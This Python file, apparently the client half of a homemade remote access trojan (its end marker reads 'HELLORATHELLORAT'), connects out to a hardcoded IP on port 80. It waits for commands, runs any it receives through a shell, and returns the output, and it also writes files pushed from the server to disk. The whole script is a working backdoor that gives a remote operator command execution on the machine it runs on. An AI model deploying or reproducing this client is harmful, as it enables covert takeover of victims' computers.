#!/usr/bin/python           # This is client.py file
import socket
import sys
from _thread import *
import sys, os, subprocess
import time
from time import ctime

HOST = '10.3.39.117'  # Symbolic name meaning all available interfaces
PORT = 80  # Arbitrary non-privileged port


def run_command(cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdoutput = proc.stdout.read() + proc.stderr.read()
    return stdoutput


def recvall(sock):
    data = ""
    part = "asd"
    while str(part) != "":
        part = str(sock.recv(1024))
        data += part
        print(part)
    sock.close()


# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = (HOST, PORT)
print(sys.stderr, 'connecting to %s port %s' % server_address)
sock.connect(server_address)

while True:
    try:
        data = sock.recv(1024)
        if not data:
            break
        print(data)
        received = str(data).split('\'')[1]
        result = bytes(1)
        print("received: " + received)
        if ">>" in received:
            command = received.split('>>', 3)
            print(command)
            if command[1] == "cmd":
                print("command: ", command[2])
                result = run_command(command[2])
                print(result)
                sock.sendall(result)
            elif command[1] == "file":
                file_name = command[2]
                print(file_name)
                f = open("1" + file_name, 'wb')  # open in binary
                print('Downloading: ' + file_name)
                # downloading
                while True:
                    count = 1
                    l = sock.recv(1024)
                    while l != '':
                        if "HELLORATHELLORAT" in str(l):
                            print("The Last")
                            u = l[:-16]
                            f.write(u)
                            print("DONE!")
                            break
                        else:
                            print('continue!', count)
                            count += 1
                            f.write(l)
                            l = sock.recv(1024)
                    break
                f.close()
            '''
            i = 1
            f = open('file_' + str(i)+".pdf", 'wb') #open in binary
            i += 1
            '''
    finally:
        a = 0
sock.close()
